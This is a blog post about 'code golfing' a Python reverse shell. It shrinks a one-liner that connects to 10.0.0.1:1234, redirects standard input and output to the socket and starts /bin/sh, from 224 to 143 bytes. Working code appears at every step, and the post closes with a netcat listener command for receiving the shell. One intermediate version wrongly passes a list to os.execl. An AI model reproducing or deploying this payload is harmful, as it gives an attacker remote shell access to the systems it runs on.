---
layout: post
title:  "Compact Python Reverse Shell Revisisted"
subtitle: "Making a compact python reverse shell, even more compact! Expanded"
categories: python hacking
published: true
comments: true
tags:
 - Python
 - Hacking
---

Expanding on the short post about this, I figured it would be worth breaking down what was done and the steps used to reduce the overall code size.

The original version (224 bytes) in its 1 line glory.

``` python
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Now lets lose the "python -c 'code goes here'". We are implying this is needed and just going to look at the python code we can play with for now. There is one little reduction we can do which is we can lose the space after the -c option.

``` python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

We can see some duplication, first s.fileno(), being called multiple times with the same parameter. So lets simplify that.

``` python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
h=s.fileno();
os.dup2(h,0);
os.dup2(h,1);
os.dup2(h,2);
p=subprocess.call(["/bin/sh","-i"]);
```

So that is a little smaller, we still have another easy duplicate os.dup2, but the past parameters are different. Easy, lets just make shorten the command then.

``` python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
h=s.fileno();
d=os.dup2;
d(h,0);
d(h,1);
d(h,2);
p=subprocess.call(["/bin/sh","-i"]);
```

So that is a little shorter again, lets take a look at our longest line now, line2. Now, those two constant, socket.AF_INET and socket.SOCK_STREAM do we need them? Can we change them to constant? Turns out they are the defaults, so let's loose them! Great, way to shave off 33bytes!

``` python
import socket,subprocess,os;
s=socket.socket();
s.connect(("10.0.0.1",1234));
h=s.fileno();
d=os.dup2;
d(h,0);
d(h,1);
d(h,2);
p=subprocess.call(["/bin/sh","-i"]);
```

Wow smaller, but still I think we can do better. Subprocess, nifty library but woah, that is a long import and call to have is there another call that would do the same thing? We know this will only work on linux since it needs a shell. So os.execl, we can use that, and that will be shorter, also we already have the import.

``` python
import socket,os;
s=socket.socket();
s.connect(("10.0.0.1",1234));
h=s.fileno();
d=os.dup2;
d(h,0);
d(h,1);
d(h,2);
os.execl(["/bin/sh","-i"]);
```

Well that is better, a few minor tweaks to the syntax a space we can lose here, a ; we don't need there. And turn it back into a one liner and you get. The much smaller new version (143 bytes)

``` python
	python -c'import socket,os;s=socket.socket();s.connect(("10.0.0.1",1234));h=s.fileno();d=os.dup2;d(h,0);d(h,1);d(h,2);os.execl("/bin/sh","-i")'
```

SO if you where to run this on a linux system and wanted to test it out, you would need to use the following little bit of bash to setup a listener, in this case we are using netcat, which is great for this. Be aware that not all versions of netcat will support the -l option.

To receive the reverse shell a simple nc works great.

``` bash
	nc -l -v -p 1234
```
